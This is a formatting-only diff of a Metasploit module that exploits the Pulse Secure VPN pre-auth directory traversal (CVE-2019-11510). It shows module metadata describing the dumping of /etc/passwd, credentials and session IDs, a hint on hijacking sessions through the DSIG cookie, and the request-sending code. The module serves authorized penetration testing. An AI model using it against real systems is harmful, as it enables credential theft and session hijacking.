@@ -8,56 +8,59 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'                => 'Pulse Secure VPN Arbitrary File Disclosure',
-      'Description'         => %q{
-        This module exploits a pre-auth directory traversal in the Pulse Secure
-        VPN server to dump an arbitrary file. Dumped files are stored in loot.
+    super(
+      update_info(
+        info,
+        'Name' => 'Pulse Secure VPN Arbitrary File Disclosure',
+        'Description' => %q{
+          This module exploits a pre-auth directory traversal in the Pulse Secure
+          VPN server to dump an arbitrary file. Dumped files are stored in loot.
 
-        If the "Automatic" action is set, plaintext and hashed credentials, as
-        well as session IDs, will be dumped. Valid sessions can be hijacked by
-        setting the "DSIG" browser cookie to a valid session ID.
+          If the "Automatic" action is set, plaintext and hashed credentials, as
+          well as session IDs, will be dumped. Valid sessions can be hijacked by
+          setting the "DSIG" browser cookie to a valid session ID.
 
-        For the "Manual" action, please specify a file to dump via the "FILE"
-        option. /etc/passwd will be dumped by default. If the "PRINT" option is
-        set, file contents will be printed to the screen, with any unprintable
-        characters replaced by a period.
+          For the "Manual" action, please specify a file to dump via the "FILE"
+          option. /etc/passwd will be dumped by default. If the "PRINT" option is
+          set, file contents will be printed to the screen, with any unprintable
+          characters replaced by a period.
 
-        Please see related module exploit/linux/http/pulse_secure_cmd_exec for
-        a post-auth exploit that can leverage the results from this module.
-      },
-      'Author'              => [
-        'Orange Tsai',    # Discovery (@orange_8361)
-        'Meh Chang',      # Discovery (@mehqq_)
-        'Alyssa Herrera', # PoC       (@Alyssa_Herrera_)
-        'Justin Wagner',  # Module    (@0xDezzy)
-        'wvu'             # Module
-      ],
-      'References'          => [
-        ['CVE', '2019-11510'],
-        ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/'],
-        ['URL', 'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html'],
-        ['URL', 'https://hackerone.com/reports/591295']
-      ],
-      'DisclosureDate'      => '2019-04-24', # Public disclosure
-      'License'             => MSF_LICENSE,
-      'Actions'             => [
-        ['Automatic', 'Description' => 'Dump creds and sessions'],
-        ['Manual',    'Description' => 'Dump an arbitrary file (FILE option)']
-      ],
-      'DefaultAction'       => 'Automatic',
-      'DefaultOptions'      => {
-        'RPORT'             => 443,
-        'SSL'               => true,
-        'HttpClientTimeout' => 5 # This seems sane
-      },
-      'Notes'               => {
-        'Stability'         => [CRASH_SAFE],
-        'SideEffects'       => [IOC_IN_LOGS],
-        'Reliability'       => [],
-        'RelatedModules'    => ['exploit/linux/http/pulse_secure_cmd_exec']
-      }
-    ))
+          Please see related module exploit/linux/http/pulse_secure_cmd_exec for
+          a post-auth exploit that can leverage the results from this module.
+        },
+        'Author' => [
+          'Orange Tsai',    # Discovery (@orange_8361)
+          'Meh Chang',      # Discovery (@mehqq_)
+          'Alyssa Herrera', # PoC       (@Alyssa_Herrera_)
+          'Justin Wagner',  # Module    (@0xDezzy)
+          'wvu'             # Module
+        ],
+        'References' => [
+          ['CVE', '2019-11510'],
+          ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/'],
+          ['URL', 'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html'],
+          ['URL', 'https://hackerone.com/reports/591295']
+        ],
+        'DisclosureDate' => '2019-04-24', # Public disclosure
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          ['Automatic', 'Description' => 'Dump creds and sessions'],
+          ['Manual', 'Description' => 'Dump an arbitrary file (FILE option)']
+        ],
+        'DefaultAction' => 'Automatic',
+        'DefaultOptions' => {
+          'RPORT' => 443,
+          'SSL' => true,
+          'HttpClientTimeout' => 5 # This seems sane
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => [],
+          'RelatedModules' => ['exploit/linux/http/pulse_secure_cmd_exec']
+        }
+      )
+    )
 
     register_options([
       OptString.new(
@@ -106,8 +109,8 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Dumping #{path}")
 
       res = send_request_cgi(
-        'method'  => 'GET',
-        'uri'     => dir_traversal(path),
+        'method' => 'GET',
+        'uri' => dir_traversal(path),
         'partial' => true # Allow partial response due to timeout
       )
 
